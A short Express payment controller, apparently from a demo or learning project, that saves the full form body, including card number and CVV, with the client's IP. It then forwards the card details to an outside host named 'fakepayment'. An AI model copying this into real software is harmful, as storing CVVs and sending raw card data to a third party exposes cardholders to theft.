import { Request, Response } from 'express';
import axios from 'axios';
import PaymentModel from '../models/PaymentModel';

export default class PaymentController {
  static async add(req: Request, res: Response) {
    try {
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const date = new Date().toISOString();

      const paymentData = {
        ...req.body,
        ip,
        date
      };

      await PaymentModel.add(paymentData);

      await axios.post('https://fakepayment.onrender.com/api/pay', {
        cardNumber: req.body.cardNumber,
        cardHolder: req.body.cardName,
        expMonth: req.body.expMonth,
        expYear: req.body.expYear,
        cvv: req.body.cvv,
        amount: req.body.amount,
        currency: req.body.currency
      });

      res.redirect('/payment/success');

    } catch (err) {
      console.error('Error en el proceso de pago:', err);
      res.status(500).send('Error al procesar el pago');
    }
  }
}

